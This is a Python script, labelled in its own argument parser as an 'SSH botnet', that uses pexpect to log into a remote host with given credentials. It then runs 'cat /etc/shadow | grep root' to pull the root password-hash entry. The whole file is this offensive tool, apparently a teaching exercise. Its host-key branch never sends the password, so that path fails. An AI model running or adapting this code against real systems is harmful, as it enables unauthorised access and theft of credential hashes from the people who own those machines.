#!/usr/bin/env python

import argparse
import pexpect


PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_command(child, cmd):
    if child is not None:
        child.sendline(cmd)
        child.expect(PROMPT)

        print(child.before)


def connect(user, password, host, port):
    ssh_newkey = "Are you sure you want to continue connecting"
    ssh_conn_ref = "ssh: connect to host.*"
    ssh_exchange_id = "ssh_exchange_identification.*"

    conn_str = "ssh " + user + "@" + host + " -p " + port

    child = pexpect.spawn(conn_str)

    ret = child.expect([pexpect.TIMEOUT, ssh_conn_ref, ssh_exchange_id, ssh_newkey, "[P|p]assword:"])

    if ret == 0:
        print("[-] Error connecting: timeout")

        return None
    elif ret == 1:
        print(f"[-] Error connecting: \"{child.after.decode().strip()}\"")

        return None
    elif ret == 2:
        print(f"[-] Error connecting: \"{child.after.decode().strip()}\"")

        return None
    elif ret == 3:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword:"])
        if ret == 0:
            print("[-] Error connecting")

            return None
    elif ret == 4:
        child.sendline(password)
        child.expect(PROMPT)

        return child
    else:
        print("[-] Error connecting")
        print(child.after)

        return None


def main():
    parser = argparse.ArgumentParser(description="SSH botnet")

    parser.add_argument("-u", dest="user", type=str, help="specify SSH user")
    parser.add_argument("-p", dest="password", type=str, help="specify SSH password")
    parser.add_argument("-H", dest="host", type=str, help="specify SSH host")
    parser.add_argument("-P", dest="port", type=str, help="specify SSH port")

    args = parser.parse_args()

    user = args.user
    password = args.password
    host = args.host
    port = args.port

    child = connect(user, password, host, port)
    send_command(child, "cat /etc/shadow | grep root")


if __name__ == '__main__':
    main()
